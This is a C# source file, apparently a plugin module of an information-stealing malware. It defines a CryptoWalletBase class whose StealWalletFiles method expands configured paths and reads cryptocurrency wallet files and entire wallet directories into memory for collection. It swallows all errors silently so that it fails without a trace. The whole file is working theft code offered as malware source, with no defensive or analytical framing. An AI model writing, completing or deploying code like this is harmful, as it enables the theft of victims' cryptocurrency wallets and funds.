using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    public class CryptoWalletBase
    {
        protected string walletName;
        protected List<string> walletPaths;
        
        protected CryptoWalletBase()
        {
            walletPaths = new List<string>();
        }
        
        public virtual Dictionary<string, byte[]> StealWalletFiles()
        {
            Dictionary<string, byte[]> walletFiles = new Dictionary<string, byte[]>();
            
            foreach (string path in walletPaths)
            {
                try
                {
                    string expandedPath = Environment.ExpandEnvironmentVariables(path);
                    
                    if (File.Exists(expandedPath))
                    {
                        byte[] fileData = File.ReadAllBytes(expandedPath);
                        string fileName = Path.GetFileName(expandedPath);
                        walletFiles[walletName + "_" + fileName] = fileData;
                    }
                    else if (Directory.Exists(expandedPath))
                    {
                        // Copy entire directory
                        CopyDirectoryFiles(expandedPath, walletFiles);
                    }
                }
                catch { }
            }
            
            return walletFiles;
        }
        
        protected void CopyDirectoryFiles(string directory, Dictionary<string, byte[]> result)
        {
            try
            {
                string[] files = Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories);
                
                foreach (string file in files)
                {
                    try
                    {
                        byte[] fileData = File.ReadAllBytes(file);
                        string relativePath = file.Substring(directory.Length).TrimStart('\\', '/');
                        result[walletName + "_" + relativePath.Replace("\\", "_")] = fileData;
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}
